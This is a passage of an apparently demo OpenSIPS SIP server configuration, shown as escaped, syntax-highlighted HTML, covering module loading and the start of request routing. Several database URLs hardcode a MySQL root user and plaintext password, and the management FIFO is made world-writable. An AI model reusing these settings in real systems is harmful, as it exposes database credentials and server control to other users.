&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### FIFO Management Interface&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mi_fifo.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mi_fifo&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fifo_name&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/tmp/opensips_fifo&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mi_fifo&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fifo_mode&amp;#34;&lt;/span&gt;, 0666&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### URI module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;uri.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;uri&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;use_uri_table&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### USeR LOCation module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nat_bflag&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NAT&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mode&amp;#34;&lt;/span&gt;,   1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_url&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mysql://root:summit2017@127.0.0.1/opensips_2_3&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### REGISTRAR module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;registrar.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;drouting.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;drouting&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_url&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mysql://root:summit2017@127.0.0.1/opensips_2_3&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fraud_detection.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fraud_detection&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_url&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mysql://root:summit2017@127.0.0.1/opensips_2_3&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;event_route.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cachedb_local.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#loadmodule &amp;#34;aaa_radius.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#modparam(&amp;#34;aaa_radius&amp;#34;,&amp;#34;radius_config&amp;#34;,&amp;#34;modules/acc/etc/radius/radiusclient.conf&amp;#34;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### ACCounting module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* what special events should be accounted ? */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#modparam(&amp;#34;acc&amp;#34;, &amp;#34;aaa_url&amp;#34;, &amp;#34;radius:modules/acc/etc/radius/radiusclient.conf&amp;#34;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;early_media&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;report_cancels&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* by default we &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; not adjust the direct of the sequential requests.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; you enable this parameter, be sure the enable &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;append_fromtag&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   in &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rr&amp;#34;&lt;/span&gt; module */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;detect_direction&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#modparam(&amp;#34;acc&amp;#34;, &amp;#34;multi_leg_info&amp;#34;, &amp;#34;text1=$avp(src);text2=$avp(dst)&amp;#34;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#modparam(&amp;#34;acc&amp;#34;, &amp;#34;multi_leg_bye_info&amp;#34;, &amp;#34;text1=$avp(src);text2=$avp(dst)&amp;#34;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* account triggers &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;flags&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;avpops.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;avpops&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_url&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1 mysql://root:summit2017@127.0.0.1/opensips_2_3&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mysql.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mysql&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;exec_query_threshold&amp;#34;&lt;/span&gt;, 500000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cfgutils.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dialog.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rest_client.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dispatcher.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dispatcher&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_url&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mysql://root:summit2017@127.0.0.1/opensips_2_3&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;####### Routing Logic ########&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# main request routing logic&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!mf_process_maxfwd_header&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;10&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;483&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Too Many Hops&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;has_totag&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# sequential requests within a dialog should&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# take the path determined by record-routing&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;loose_route&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;INVITE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#75715e&#34;&gt;# even if in most of the cases is useless, do RR for&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#75715e&#34;&gt;# re-INVITEs alos, as some buggy clients do change route set&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#75715e&#34;&gt;# during the dialog.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				record_route&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# route it out to whatever destination was set by loose_route()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# in $du (destination URI).&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;relay&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ACK&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; t_check_trans&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					&lt;span style=&#34;color:#75715e&#34;&gt;# non loose-route, but stateful ACK; must be an ACK after &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					&lt;span style=&#34;color:#75715e&#34;&gt;# a 487 or e.g. 404 from upstream server&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					t_relay&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					&lt;span style=&#34;color:#75715e&#34;&gt;# ACK without matching transaction -&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					&lt;span style=&#34;color:#75715e&#34;&gt;# ignore and discard&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;404&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Not here&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!save&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			sl_reply_error&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# CANCEL processing&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CANCEL&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
